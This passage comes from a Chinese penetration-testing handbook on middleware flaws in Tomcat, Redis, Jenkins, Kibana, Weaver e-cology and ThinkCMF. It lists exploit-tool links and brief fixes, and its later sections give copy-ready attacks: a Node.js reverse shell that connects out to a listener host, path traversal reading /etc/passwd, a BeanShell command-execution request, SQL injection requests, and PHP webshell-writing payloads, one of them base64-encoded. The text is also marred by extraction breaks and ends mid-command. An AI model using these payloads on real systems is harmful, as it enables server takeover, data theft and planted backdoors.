\u76f4\u63a5\u4e0b\u8f7d\u4e0d\u53d7\u5f71\u54cd\u7684\u65b0\u7248\u672c\u963f\u91cc\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u516c\u544a\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7528\u6237 \u7acb \u523b \u5347 \u7ea7 \u5230 1.2.28/1.2.29 \u6216\u66f4\u9ad8\u7684\u7248\u672c\uff0c\u4e0b\u8f7d\u5730\u5740\uff1a http://repo1.maven.org/maven2/com/alib aba/fastjson/1.2.29/ Struts\u7cfb\u5217\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Apache Struts2 \u4f5c \u4e3a \u4e16 \u754c \u4e0a \u6700 \u6d41 \u884c \u7684 Java Web \u670d\u52a1\u5668\u6846\u67b6\u4e4b\u4e00\uff0c\u4ece\u51fa\u73b0\u6f0f\u6d1e\u81f3\u4eca\u867d\u7136\u6709\u4e9b\u5e74\u5934\uff0c\u4f46\u662f\u4ecd\u7136\u6ca1\u6709\u6d88\u5931\u3002 \u5f71\u54cd\u7ec4\u4ef6 Struts \u6f0f\u6d1e\u590d\u73b0 Struts2 \u5386\u53f2 RCE \u6f0f\u6d1e\u56de\u987e\u4e0d\u5b8c\u5168\u7cfb\u5217 https://rickgray.me/2016/05/06/review-struts2-remote-command \ufffeexecution-vulnerabilities/ \u6d45\u8c08struts2\u5386\u53f2\u4e0a\u7684\u9ad8\u5371\u7a81\u7834 https://www.anquanke.com/post/id/86757 strut2\u5404\u7248\u672c\u6f0f\u6d1e\u4fe1\u606f\u6574\u7406 https://www.zybuluo.com/Dukebf/note/821989 \u5229\u7528\u5de5\u5177 HatBoy/Struts2-Scan https://github.com/HatBoy/Struts2-Scan Struts2\u5947\u8469\u73af\u5883\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u5de5\u5177 https://www.cnblogs.com/k8gege/p/10261217.html \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u5230\u6700\u65b0\u7248\u4e0d\u5efa\u8bae\u4f7f\u7528Struts Solr\u7cfb\u5217 \u00b6 \u7ec4\u4ef6\u63cf\u8ff0 Apache Solr\u662f\u4e00\u4e2a\u9ad8\u5ea6\u53ef\u9760\u3001\u53ef\u4f38\u7f29\u548c\u5bb9\u9519\u7684\uff0c\u63d0\u4f9b\u5206\u5e03\u5f0f\u7d22\u5f15\u3001\u590d\u5236\u548c\u8d1f\u8f7d \u5e73\u8861\u67e5\u8be2\u3001\u81ea\u52a8\u6545\u969c\u8f6c\u79fb\u548c\u6062\u590d\u3001\u96c6\u4e2d\u914d\u7f6e\u7b49\u529f\u80fd\u7684\u5f00\u6e90\u7684\u641c\u7d22\u670d\u52a1\u5668 \u3002Solr\u4e3a\u4e16\u754c\u4e0a\u8bb8\u591a\u6700\u5927\u7684\u4e92\u8054\u7f51\u7ad9\u70b9\u63d0\u4f9b\u641c\u7d22\u548c\u5bfc\u822a\u529f\u80fd\u3002Solr \u4f7f\u7528 Java \u8bed\u8a00\u5f00\u53d1\uff0c\u4e3b\u8981\u57fa\u4e8e HTTP \u548c Apache Lucene \u5b9e\u73b0\u3002Apache Solr \u4e2d \u5b58 \u50a8 \u7684 \u8d44 \u6e90 \u662f \u4ee5 Document \u4e3a\u5bf9\u8c61\u8fdb\u884c\u5b58\u50a8\u7684\u3002\u6bcf\u4e2a\u6587\u6863\u7531\u4e00\u7cfb\u5217\u7684 Field \u6784\u6210\uff0c\u6bcf\u4e2a Field \u8868 \u793a \u8d44 \u6e90 \u7684 \u4e00 \u4e2a \u5c5e \u6027 \u3002 Solr \u4e2d \u7684 \u6bcf \u4e2a Document \u9700\u8981\u6709\u80fd\u552f\u4e00\u6807\u8bc6\u5176\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u5c5e\u6027\u7684\u540d\u5b57\u662f id\uff0c\u5728 Schema \u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528\uff1a id \u5f71\u54cd\u7ec4\u4ef6 solr \u6f0f\u6d1e\u590d\u73b0 Solr\u7cfb\u5217\u6f0f\u6d1e\u590d\u73b0 https://www.jianshu.com/p/43e7f13e2058 \u5229\u7528\u5de5\u5177 k8gege/SolrExp https://github.com/k8gege/SolrExp 1135/solr_exploit https://github.com/1135/solr_exploit \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u5230\u6700\u65b0\u7248\u4e0d\u8981\u5bf9\u5916\u5f00\u653e\u654f\u611f\u7aef\u53e3 Tomcat\u7c7b \u00b6 Tomcat \u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e (CVE-2020-1938) \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Tomcat \u662f \u5e38 \u89c1 \u7684 Web \u5bb9 \u5668 , \u7528 \u6237 \u91cf \u975e \u5e38 \u5de8 \u5927 , Tomcat 8009 ajp\u7aef\u53e3\u4e00\u76f4\u662f\u9ed8\u8ba4\u5f00\u653e\u7684 \u5f71\u54cd\u8303\u56f4 Apache Tomcat 6 Apache Tomcat 7 < 7.0.100 Apache Tomcat 8 < 8.5.51 Apache Tomcat 9 < 9.0.31 \u6f0f\u6d1e\u7279\u5f81 tomcat/8009/ajp \\x04\\x01\\xf4\\x00\\x15 \u6f0f\u6d1e\u590d\u73b0 CVE-2020-1938 \u5e7d \u7075 \u732b ( GhostCat ) Tomcat-Ajp \u534f\u8bae\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6/JSP\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 https://www.guildhab.top/?p=2406 Apache Tomcat\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 https://yinwc.github.io/2020/03/01/CVE-2020-1938/ CVE-2020-1938:Tomcat AJP\u534f\u8bae\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/ \u68c0\u6d4b\u5de5\u5177 bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner https://github.com/bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi \ufffeScanner \u957f\u4ead\u79d1\u6280\u68c0\u6d4b\u5de5\u5177 https://www.chaitin.cn/zh/ghostcat#download \u9632\u62a4\u65b9\u6cd5 \u66f4\u65b0\u4e3a\u6700\u65b0\u7248\u672c \u82e5 \u4e0d \u9700 \u8981 \u4f7f \u7528 Tomcat AJP \u534f \u8bae \uff0c \u53ef \u76f4 \u63a5 \u5173 \u95ed AJP Connector\uff0c\u6216\u5c06\u5176\u76d1\u542c\u5730\u5740\u6539\u4e3a\u4ec5\u76d1\u542c\u672c\u673alocalhost\u3002 CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Apache Tomcat\u53d1\u5e03\u901a\u544a\u79f0\u4fee\u590d\u4e86\u4e00\u4e2a\u6e90\u4e8e\u6301\u4e45\u5316Session\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \uff08CVE-2020-9484\uff09\u3002 \u6f0f\u6d1e\u6761\u4ef6\u6bd4\u8f83\u82db\u523b\uff1a tomcat\u5fc5\u987b\u542f\u7528session\u6301\u4e45\u5316\u529f\u80fdFileStore tomcat/lib \u6216 \u8005 WEB-INF/lib \u76ee \u5f55 \u4e0b \u7684 \u4f9d \u8d56 \u5b58 \u5728 \u53ef \u7528 \u7684 gadget 3. \u5728\u670d\u52a1\u5668\u4e0a\u5b58\u5728\u5df2\u77e5\u8def\u5f84\u6587\u4ef6\u5185\u5bb9\u53ef\u63a7 \u5f71\u54cd\u8303\u56f4 Apache Tomcat 10.x < 10.0.0-M5 Apache Tomcat 9.x < 9.0.35 Apache Tomcat 8.x < 8.5.55 Apache Tomcat 7.x < 7.0.104 \u6f0f\u6d1e\u4f9d\u8d56\u6761\u4ef6 \u914d\u7f6esession\u6301\u4e45\u5316 conf/context.xml \u90e8\u7f72Gadgets jar\u5305 \u4e0b\u8f7dcommons-collections4-4.0.jar \u5e76\u653e\u5728tomcat lib/\u76ee\u5f55\u4e0b \u6f0f\u6d1e\u590d\u73b0 CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790\u4e0e\u590d\u73b0 https://www.cnblogs.com/potatsoSec/p/12931427.html CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790\u4e0e\u590d\u73b0 https://blog.csdn.net/Jietewang/article/details/106462903 \u6f0f\u6d1e\u5229\u7528 tomcat-cluster-session-sync-exp https://github.com/threedr3am/tomcat-cluster-session-sync-exp \u9632\u62a4\u65b9\u6cd5 Apache Tomcat\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u65b0\u7248\u672c\u4fee\u590d\u4e0a\u8ff0\u6f0f\u6d1e\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5347\u7ea7 \u8fdb\u884c\u9632\u62a4\u3002\u4e0d\u65b9\u4fbf\u5347\u7ea7\u7684\u7528\u6237\uff0c\u8fd8\u53ef\u4ee5\u6682\u65f6\u7981\u7528FileStore\u529f\u80fd\uff0c\u6216\u8005 \u5355\u72ec\u914d\u7f6esessionAttributeValueClassNameFilte\u7684\u503c\u6765\u786e\u4fdd\u53ea\u6709\u7279\u5b9a \u5c5e\u6027\u7684\u5bf9\u8c61\u53ef\u4ee5\u88ab\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u3002 Redis\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u90e8\u5206 Redis \u7ed1\u5b9a\u5728 0.0.0.0:6379 \uff0c\u5e76\u4e14\u6ca1\u6709\u5f00\u542f\u8ba4\u8bc1\uff08\u8fd9\u662f Redis \u7684\u9ed8\u8ba4\u914d\u7f6e\uff09\uff0c\u5982\u679c\u6ca1\u6709\u8fdb\u884c\u91c7\u7528\u76f8\u5173\u7684\u7b56\u7565\uff0c\u6bd4\u5982\u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219\u907f \u514d \u5176 \u4ed6 \u975e \u4fe1 \u4efb \u6765 \u6e90 ip \u8bbf \u95ee \u7b49 \uff0c \u5c06 \u4f1a \u5bfc \u81f4 Redis \u670d\u52a1\u76f4\u63a5\u66b4\u9732\u5728\u516c\u7f51\u4e0a\uff0c\u5bfc\u81f4\u5176\u4ed6\u7528\u6237\u53ef\u4ee5\u76f4\u63a5\u5728\u975e\u6388\u6743\u60c5\u51b5\u4e0b\u76f4\u63a5\u8bbf \u95ee Redis \u670d\u52a1\u5e76\u8fdb\u884c\u76f8\u5173\u64cd\u4f5c\u3002\u5229\u7528 Redis \u81ea\u8eab\u7684\u63d0\u4f9b\u7684 config \u547d\u4ee4\uff0c\u53ef\u4ee5\u8fdb\u884c\u5199\u6587\u4ef6\u64cd\u4f5c\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6210\u529f\u5c06\u81ea\u5df1\u7684\u516c\u94a5\u5199\u5165\u76ee\u6807\u670d \u52a1 \u5668 \u7684 /root/.ssh \u6587 \u4ef6 \u5939 \u7684 authotrized_keys \u6587\u4ef6\u4e2d\uff0c\u8fdb\u800c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5bf9\u5e94\u7684\u79c1\u94a5\u767b\u5f55\u76ee\u6807\u670d\u52a1\u5668\u3002 \u5f71\u54cd\u7ec4\u4ef6 Redis \u6f0f\u6d1e\u7279\u5f81 6379\u7aef\u53e3 \u6f0f\u6d1e\u590d\u73b0 Redis \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u5229\u7528\u603b\u7ed3 http://www.alloyteam.com/2017/07/12910/ Redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u603b\u7ed3 https://fragrant10.github.io/2019/02/13/Redis%E6%9C%AA%E6%8 E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6 %B4%9E%E6%80%BB%E7%BB%93.html \u590d\u73b0\u5751\u70b9\u5206\u6790 redis\u6f0f\u6d1e\u5229\u7528 https://www.jianshu.com/p/2f56a58a1450 redis 4.x/5.x\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff08\u4ee5\u53ca\u4e00\u4e9b\u73af\u5883\u642d\u5efa\u7684\u5751\uff09(7\u670818\u66f4\u65b0\uff09 http://www.mucn.site/index.php/Termux/210.html \u9632\u62a4\u65b9\u6cd5 redis\u6570\u636e\u5e93\u6f0f\u6d1e\u9632\u62a4 https://www.cnblogs.com/rinack/p/11099854.html redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u7684\u5229\u7528\u548c\u9632\u62a4 https://carey.akhack.com/2020/05/07/Redis%E6%9C%AA%E6%8E %88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6% B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9 %98%B2%E6%8A%A4/ Zabbix\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Zabbix\u7ec4\u4ef6\u4e3b\u8981\u5b58\u5728\u6ce8\u5165/\u5f31\u53e3\u4ee4/\u547d\u4ee4\u6267\u884c\u7b49\u7c7b\u578b\u7684\u6f0f\u6d1e\u3002 \u5f71\u54cd\u7ec4\u4ef6 Zabbix \u6f0f\u6d1e\u590d\u73b0\uff1a \u4fe1\u606f\u6536\u96c6 - Zabbix - \u6f0f\u6d1e - \u6c47\u603b https://www.cnblogs.com/AtesetEnginner/p/12641747.html Zabbix\uff08\u5206\u5e03\u5f0f\u7cfb\u7edf\u76d1\u89c6\uff09\u6f0f\u6d1e\u5b66\u4e60 https://www.jianshu.com/p/85e3b0266158 \u8bb0\u4e00\u6b21zabbix\u5b89\u88c5\u53ca\u6f0f\u6d1e\u5229\u7528getshell\u5168\u8fc7\u7a0b https://xz.aliyun.com/t/6874 Zabbix \u6700\u65b0 SQL \u6ce8\u5165\u6f0f\u6d1e\u53ca EXP \u2013 Jamin Zhang https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection \ufffeVulnerability-and-EXP/ \u6700\u65b0Zabbix\u6f0f\u6d1e\u53ca\u5176\u5229\u7528\u59ff\u52bf\uff08\u9644EXP\uff09 https://zhuanlan.zhihu.com/p/22082375 \u9632\u62a4\u65b9\u6cd5 https://www.bbsmax.com/A/QV5ZqlDeJy/ Jenkins\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Jenkins \u662f \u5e38 \u89c1 \u7684 CI/CD \u670d \u52a1 \u5668 , \u6700\u5e38\u89c1\u7684\u5c31\u662f\u7206\u7834\u5f31\u53e3\u4ee4\u7136\u540e\u4f7f\u7528groovy\u6267\u884c\u547d\u4ee4 \u5f71\u54cd\u7ec4\u4ef6 Jenkins \u6f0f\u6d1e\u7279\u5f81 Jenkins \u6f0f\u6d1e\u590d\u73b0 Jenkins\u6f0f\u6d1e\u96c6\u5408\u590d\u73b0 https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4 %9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/ Jenkins\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u5206\u6790 https://www.freebuf.com/news/178808.html \u6f0f\u6d1e\u5229\u7528 blackye/Jenkins: Jenkins\u6f0f\u6d1e\u63a2\u6d4b\u3001\u7528\u6237\u6293\u53d6\u7206\u7834 https://github.com/blackye/Jenkins gquere/pwn_jenkins: Notes about attacking Jenkins servers https://github.com/gquere/pwn_jenkins Jenkins\u810f\u725b\u6f0f\u6d1eFRP\u5185\u7f51\u63d0\u6743 https://www.freebuf.com/articles/web/215183.html \u5229\u7528\u6280\u5de7 \u53ef \u4ee5 \u5728 Jenkins \u5904 \u8fdb \u884c \u5185 \u7f51 \u4fe1 \u606f \u6536 \u96c6 , \u83b7\u53d6\u7684\u8d26\u53f7\u901a\u5e38\u4e5f\u662f\u5f00\u53d1/\u8fd0\u7ef4\u7ea7\u522b\u7684, \u6743\u9650\u76f8\u5bf9\u8f83\u5927\u3002 \u9632\u62a4\u65b9\u6cd5 \u8bbe\u7f6e\u5f3a\u53e3\u4ee4\u5c3d\u91cf\u4e0d\u8981\u5f00\u653e\u5230\u516c\u7f51\u9650\u5236\u6765\u6e90IP\u5347\u7ea7\u5230\u6700\u65b0\u7248 Kibana\u76f8\u5173 \u00b6 Kibana\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2019-7609) \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Kibana \u662f\u4e3a Elasticsearch\u8bbe\u8ba1\u7684\u5f00\u6e90\u5206\u6790\u548c\u53ef\u89c6\u5316\u5e73\u53f0\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 Kibana \u6765 \u641c \u7d22 \uff0c \u67e5 \u770b \u5b58 \u50a8 \u5728 Elasticsearch \u7d22\u5f15\u4e2d\u7684\u6570\u636e\u5e76\u4e0e\u4e4b\u4ea4\u4e92\u3002\u4f60\u53ef\u4ee5\u5f88\u5bb9\u6613\u5b9e\u73b0\u9ad8\u7ea7\u7684\u6570\u636e\u5206\u6790\u548c\u53ef\u89c6\u5316 \uff0c\u4ee5\u56fe\u6807\u7684\u5f62\u5f0f\u5c55\u73b0\u51fa\u6765\u3002 \u653b\u51fb\u8005\u5229\u7528\u6f0f\u6d1e\u53ef\u4ee5\u901a\u8fc7Timelion\u7ec4\u4ef6\u4e2d\u7684JavaScript\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb \uff0c\u5411Kibana\u53d1\u8d77\u76f8\u5173\u8bf7\u6c42\uff0c\u4ece\u800c\u63a5\u7ba1\u6240\u5728\u670d\u52a1\u5668\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb \u610f\u547d\u4ee4\u3002 \u5f71\u54cd\u7248\u672c Kibana < 6.6.1 Kibana < 5.6.15 \u68c0\u6d4b\u65b9\u6cd5 \u6587\u4e2d\u7ed9\u51fa\u4e86POC https://dylan903.github.io/2019/10/20/kibana-rce-lou-dong-fu-xian/ \u6f0f\u6d1e\u590d\u73b0 CVE-2019-7609 Kibana\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u653b\u51fb\u65b9\u6cd5\u548c\u6f0f\u6d1e\u539f\u7406\u5206\u6790 https://cloud.tencent.com/developer/article/1535121 CVE-2019-7609 Kibana \u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0 http://blog.leanote.com/post/snowming/2cd6256df61d \u6f0f\u6d1e\u5229\u7528 jas502n/kibana-RCE https://github.com/jas502n/kibana-RCE \u5751\u70b9 \u90e8 \u7f72 \u8fc7 \u7a0b \u4e2d \u5982 \u679c \u51fa \u73b0 Kibana server is not ready yet,\u90a3\u4e48\u4f60\u662f\u9700\u8981\u786e\u5b9a\u4e0b \u4f60\u7684kibana\u4e0eelasticsearch\u7248\u672c\u662f\u5426\u4e00\u81f4 es\u8981\u7528\u975eroot\u7528\u6237\u542f\u52a8\uff0c\u5426\u5219\u4f1a\u62a5can not run elasticsearch as root\u9519\u8bef\u3002 \u9632\u5fa1\u65b9\u6cd5 \u5347\u7ea7Kibana\u81f3\u65b0\u7248\u672c Kibana\u6f0f\u6d1eCVE-2018-17246 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u6b64\u6f0f\u6d1e\u51fa\u73b0\u5728Kibana\u63a7\u5236\u53f0\uff08Console\uff09\u63d2\u4ef6\u4e2d\uff0c\u63a7\u5236\u53f0\u63d2\u4ef6\u662fKIban a\u7684\u57fa\u672c\u63d2\u4ef6\uff0c\u4e5f\u5c31\u662fKibana\u5fc5\u88c5\u7684\u63d2\u4ef6\u3002\u5f53\u524delastic\u6700\u65b0\u7248\u672c\u4e3a6.5 \uff0c\u53ef\u4ee5\u8bf4\u5927\u90e8\u5206elk\u7684\u7ec4\u4ef6\u4f1a\u5b58\u5728\u6b64\u95ee\u9898\uff0c\u4f46\u662f\u6b64\u95ee\u9898\u5229\u7528\u96be\u70b9\u5728\u4e8e\u5982 \u4f55\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7684\u672c\u5730\u6587\u4ef6\u3002 \u5f71\u54cd\u7248\u672c ElasticSearch Kibana < 6.4.3 ElasticSearch Kibana < 5.6.13 \u5229\u7528\u65b9\u6cd5 \u8bfb\u6587\u4ef6\u64cd\u4f5c http://192.168.1.3:5601/api/console/api_server?sense_version=%4 0%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd \u53cd\u5f39shell\u5728kibana\u7684\u673a\u5668\u521b\u5efa /tmp/shell.js (function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(8080, \"192.168.1.2\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })(); \u8bf7\u6c42\u5305\u542b\u521a\u521a\u521b\u5efa\u7684shell\uff1a http://192.168.1.3:5601/api/console/api_server?sense_version=%4 0%40SENSE_VERSION&apis=../../../../../../../../../../../tmp/shell.js \u672c\u5730\u76d1\u542c\uff1a nc -l 8080 -v \u6f0f\u6d1e\u590d\u73b0 Elasticsearch \u6838\u5fc3\u63d2\u4ef6Kibana \u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790\uff08CVE-2018- 17246\uff09 https://www.anquanke.com/post/id/168291 ELK LFI CVE-2018-17246 https://wh0ale.github.io/2018/12/18/2018-12-18- ELK%20LFI%20CVE-2018-17246/ \u5751\u70b9 \u6700\u7ec8\u6f0f\u6d1e\u7684\u5f71\u54cd\u5173\u952e\u5728\u4e8e\u5982\u4f55\u521b\u5efashell\u6587\u4ef6\u3002 \u4fee\u590d\u5efa\u8bae \u76ee\u524d\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u6f0f\u6d1e\uff0c\u8865\u4e01\u83b7\u53d6\u94fe\u63a5: https://access.redhat.com/security/cve/cve-2018-17246 \u6cdb\u5faeOA\u76f8\u5173 \u00b6 \u6cdb\u5faeOA\u7cfb\u7edf\u591a\u7248\u672c\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u6cdb\u5faeOA\u529e\u516c\u7cfb\u7edf\u662f\u4e00\u6b3e\u534f\u8c03\u529e\u516c\u8f6f\u4ef6\u3002 \u6cdb\u5fae\u534f\u540c\u5546\u52a1\u8f6f\u4ef6\u7cfb\u7edf\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u670d \u52a1\u5668\u6743\u9650\u3002 \u5f71\u54cd\u8303\u56f4 \u6cdb\u5fae e-cology<=9.0 \u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/Sylon/p/11765543.html Poc \u6f0f\u6d1e\u8def\u5f84:/weaver/bsh.servlet.BshServlet exec(\"whoami\")curl http://xx.xx.xx.xx.xx/weaver/bsh.servlet.BshServlet/ -d 'bsh.script=eval%00(\"ex\"%2b\"ec(\"whoami\")\");&bsh.servlet.capture OutErr=true&bsh.servlet.outp ut=raw' \u6279\u91cf\u68c0\u6d4b\u5de5\u5177 https://github.com/sunird/e-cology-poc \u9632\u62a4\u65b9\u6cd5 \u5c4f\u853d/weaver/*\u76ee\u5f55\u7684\u8bbf\u95ee\uff1b https://www.weaver.com.cn/cs/securityDownload.asp \u6cdb\u5faeE-cology OA\u7cfb\u7edfSQL\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u6cdb \u5fae e-cology OA\u7cfb\u7edf\u7684WorkflowCenterTreeData\u63a5\u53e3\u5728\u4f7f\u7528Oracle\u6570\u636e\u5e93\u65f6,\u7531\u4e8e \u5185 \u7f6e SQL \u8bed \u53e5 \u62fc \u63a5 \u4e0d \u4e25 , \u5bfc \u81f4 \u6cdb \u5fae e-cology OA\u7cfb\u7edf\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b \uff0c\u8fdc\u7a0b\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684SQL\u8bed\u53e5\uff0c\u4ece\u800c\u83b7\u53d6\u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f\u3002 \u5f71\u54cd\u8303\u56f4 \u6cdb\u5faee-cology<=9.0 \u6f0f\u6d1e\u590d\u73b0 \u6cdb\u5fae\u751f\u6001OA\u7cfb\u7edfSQL\u6ce8\u5165\u6269\u5c55\u590d\u73b0 https://mumuka.gitee.io/passages/%E6%B3%9B%E5%BE%AEe \ufffecology%20OA%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F% E6%B4%9E%E5%A4%8D%E7%8E%B0/ \u6cdb\u5fae e-cology OA \u524d\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0 https://cloud.tencent.com/developer/article/1521764 \u7b80\u6613poc POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&sco pe=2333 HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflateContent-Type: application/x-www\ufffeform-urlencoded Content-Length: 2236 Connection: close Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0dunion select NULL,value from v$parameter order by (((1 \u5229\u7528\u5de5\u5177 AdministratorGithub/e-cology-OA-SQL https://github.com/AdministratorGithub/e-cology-OA-SQL mmioimm/ecology_test https://github.com/mmioimm/ecology_test \u9632\u62a4\u65b9\u6cd5 \u53ca\u65f6\u6253\u8865\u4e01 \u6cdb\u5fae\u5b98\u65b9\u5b89\u5168\u8865\u4e01\uff1a https://www.weaver.com.cn/cs/securityDownloa d.asp Thinkcmf\u76f8\u5173 \u524d\u53f0SQL\u6ce8\u5165: \u4f9d\u8d56\u6761\u4ef6 \u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c payload\uff1a POST /ThinkCMFX/index.php?g=portal&m=article&a=edit_post HTTP/1.1 Host: localhost Connection: close Cookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95 Content-Type: application/x-www-form-urlencoded Content-Length: 79 postid=bind&postid=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+- \u524d\u53f0\u6a21\u7248\u6ce8\u5165\u6f0f\u6d1e -\u53efgetshell\u56db\u5904 \uff08\u4ec5\u5728windows\u73af\u5883\u4e0b\u8bbe\u7f6e\uff09 \u7b2c\u4e00\u5904 http://website/ThinkCMFX/index.php?g=Comment&m=Widget&a=fetch & templateFile=/../public/index&content=<%3fphp+file_put_contents('m.p hp','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e8c \u5904 http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templ ateFile=/../../../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e8c \u5904 http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templ ateFile=/../../../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e09 \u5904 /index.php?a=fetch&templateFile=public/index&prefix=''&content=<php file_put_contents('test.php','<?php phpinfo(); ?>') \u7b2c\u56db\u5904/index.php?a=fetch&content=<?php+file_put_contents(\"mrxn.php\", base64_decode(\"PD9waHAgZXZhbCgkX1BPU1RbIjAwMCJdKTs/Pg== \")); \u4efb\u610f\u6587\u4ef6\u5220\u9664 -\u53ea\u80fdwindows\u5220\u9664 \u5728\u7528\u6237\u4e0a\u4f20\u5934\u50cf\u5904\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff0c\u53d1\u9001\u5982\u4e0b\u6570\u636e\u5305\u540e\uff0c\u4f1a\u5220\u9664\u7f51 \u7ad9\u6839\u76ee\u5f55\u4e0b\u4e00\u4e2a\u540d\u4e3a test.txt \u7684\u6587\u4ef6\u3002\uff08\u8be5\u6f0f\u6d1e\u4ec5\u80fd\u5728 Windows \u4e0b\u89e6\u53d1\uff09 POST /ThinkCMFX/index.php?g=User&m=Profile&a=do_avatar& HTTP/1.1 Host: localhost Cookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 27 imgurl=......\\test.txt \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u5728 ThinkCMFX2.2.3 \u6700\u7ec8\u7248\u4e2d\uff0c\u5b58\u5728\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff08\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c\uff09 curl -F \"file=@/tmp/shell.php\" -X 